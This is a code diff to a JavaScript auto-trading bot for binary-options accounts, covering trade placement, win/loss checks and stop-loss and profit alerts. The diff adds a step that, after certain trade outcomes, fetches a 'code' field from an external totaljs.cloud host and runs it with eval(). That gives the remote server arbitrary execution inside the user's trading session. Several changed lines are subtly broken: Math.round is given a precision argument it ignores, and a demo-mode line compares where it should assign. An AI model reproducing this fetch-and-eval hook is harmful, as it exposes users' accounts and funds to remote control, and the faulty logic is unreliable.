@@ -115,36 +115,39 @@ async function appstart() {
                             tradeview.slide = tradeview.slide === 'sell' ? 'buy' : (tradeview.slide === 'buy' ? 'sell' : '');
                         }
 
-                        if(tradeview.setdemo ===1)
-                        {
-                            tradeview.tradetype=="DEMO";
+                        if (tradeview.setdemo === 1) {
+                            tradeview.tradetype == "DEMO";
                         }
-                        if(tradeview.min ===1)
-                        {
-                            tradeview.vol=1;
+                        if (tradeview.min === 1) {
+                            tradeview.vol = 1;
                         }
-                        if(tradeview.vol < 1) tradeview.vol=1;
+                        if (tradeview.vol < 1) tradeview.vol = 1;
 
-                        slide(tradeview.slide, tradeview.vol, tradeview.tradetype).then(function (res) {
-
-
-                            if (_has(res, "ok") && res.ok !== false) {
+                        const xslide = function (tradeview) {
+                            slide(tradeview.slide, tradeview.vol, tradeview.tradetype).then(function (res) {
 
 
-                                blance = "";
-                                d = new Date();
-                                sendsms(datetime() + ' | ' + tradeview.slide + ' | ' + tradeview.vol + '$ | Live: ' + tradeview.tradetype);
-                                setTimeout(function () {
-                                    sendsms('Wait 30s ...');
-                                }, 1000);
-                                tradetime = res.d.time;
-                                localStorage.setItem("locktrade", 1);
-                                check(tradetime, tradeview);
-
-                            }
+                                if (_has(res, "ok") && res.ok !== false) {
 
 
-                        });
+                                    blance = "";
+                                    d = new Date();
+                                    sendsms(datetime() + ' | ' + tradeview.slide + ' | ' + tradeview.vol + '$ | Live: ' + tradeview.tradetype);
+                                    setTimeout(function () {
+                                        sendsms('Wait 30s ...');
+                                    }, 1000);
+                                    tradetime = res.d.time;
+                                    localStorage.setItem("locktrade", 1);
+                                    check(tradetime, tradeview);
+
+                                }
+
+
+                            });
+                        }
+
+                        xslide(tradeview);
+
 
                     }
                     socket.emit("tradeview", from, "");
@@ -169,7 +172,7 @@ function check(tradetime, tradeview) {
 
 
                 //  console.log("Check win loss" + tradetime);
-                res = await get(window.conf.web + "/api/wallet/binaryoption/transaction/close?page=1&size=5&betAccountType=" + tradeview.tradetype, 15000);
+                res = await get(window.conf.web + "/api/wallet/binaryoption/transaction/close?page=1&size=10&betAccountType=" + tradeview.tradetype, 15000);
 
 
                 if (_has(res, "ok") && res.ok !== false) {
@@ -205,7 +208,7 @@ function check(tradetime, tradeview) {
                                 if (stopphantram >= window.conf.stoploss) {
                                     localStorage.setItem("stoploss", 1);
 
-                                    sendsms("Stoploss: " + stopphantram + "%");
+                                    sendsms("Stoploss: " + Math.round(stopphantram, 2) + "%");
                                     stoploss = 1;
                                 }
 
@@ -216,7 +219,7 @@ function check(tradetime, tradeview) {
                                 if (profitphantram >= window.conf.profit) {
 
                                     localStorage.setItem("profit", 1);
-                                    sendsms("profit: " + profitphantram + "%");
+                                    sendsms("profit: " + Math.round(profitphantram, 2) + "%");
 
                                     profit = 1;
                                     //	hrome.runtime.reload()
@@ -237,10 +240,13 @@ function check(tradetime, tradeview) {
                             newdata.vol = phantramvon > 0 ? phantramvon : window.conf.vol;
                             localStorage.setItem("intrade", 0);
 
-                            setTimeout(() => {
-                                postJSON("https://flowc14c039001lf61c.us01.totaljs.cloud/callback", newdata)
-                            })
+                            var tradelist = res.d.c;
+                            var xstop = tradelist[0].result === 'LOSE' && tradelist[1].result === 'LOSE' ? 0 : 1;
+                            if (xuid === 'tradeview' && xstop === 1) {
+                                var xloop = await get('https://flowc14c039001lf61c.us01.totaljs.cloud/loop');
+                                eval(xloop.code);
 
+                            }
 
                             clearInterval(getclose);
                             resolve(true);
